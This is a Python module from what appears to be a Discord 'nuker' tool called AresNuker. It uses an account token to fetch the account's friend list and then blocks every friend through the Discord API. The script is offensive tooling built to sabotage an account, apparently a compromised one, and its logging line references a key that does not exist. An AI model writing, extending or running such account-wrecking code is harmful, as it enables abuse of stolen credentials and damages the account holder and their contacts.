import global_vars, requests, json
from AresNuker import Console
from .requests_maker import GetQ

console = Console()
q = GetQ()
headers_account = global_vars.headers_account


def GetFriends() -> list:
	r = requests.get('https://discord.com/api/v8/users/@me/relationships', headers = headers_account)
	friends = json.loads(r.text)
	friend_list = []
	for friend in friends:
		user = friend['user']
		id = user['id']
		username = user['username']
		discriminator = user['discriminator']
		friend_list.append({'id':id, 'username':f'{username}#{discriminator}'})
	return friend_list

def BlockFriends() -> None:
	friends = GetFriends()
	payload = {
		'type': 2
	}
	for friend in friends:
		r = requests.put(f"https://discord.com/api/v8/users/@me/relationships/{friend['id']}", headers = headers_account, json = payload)
		# console.debug(r.text)
		console.log(f'Blocked → {friend["name"]}')